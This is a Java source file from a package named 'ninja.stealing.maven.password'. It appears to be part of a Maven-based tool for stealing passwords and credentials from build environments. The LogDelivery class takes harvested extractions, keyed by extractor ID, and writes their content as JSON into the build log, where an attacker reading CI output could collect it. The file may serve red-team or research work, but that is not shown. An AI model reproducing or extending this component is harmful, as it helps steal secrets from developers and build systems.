package ninja.stealing.maven.password.delivery;

import java.util.List;

import com.fasterxml.jackson.databind.node.ObjectNode;
import ninja.stealing.maven.password.Logger.Logger;
import org.apache.maven.plugin.logging.Log;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

import ninja.stealing.maven.password.model.Extraction;

public class LogDelivery implements Delivery {
	private Logger log;
	
	public LogDelivery(Logger log) {
		this.log = log;
		
	}
	
	@Override
	public void deliver(List<Extraction> extractions) {
		ObjectMapper mapper = new ObjectMapper();
		ObjectNode logNode = mapper.createObjectNode();
		log.info("Delivering extraction through log");
		for (Extraction extraction: extractions) {
			log.info("Extracting: " + extraction.getExtractorId());
			logNode.put(extraction.getExtractorId(),extraction.getContent());
		}
		String json = "";
		try {
			json = mapper.writerWithDefaultPrettyPrinter().writeValueAsString(logNode);
		} catch (JsonProcessingException e) {
			json = "Can't decode json";
		}
		log.info("  - Content: " + json);

	}

}
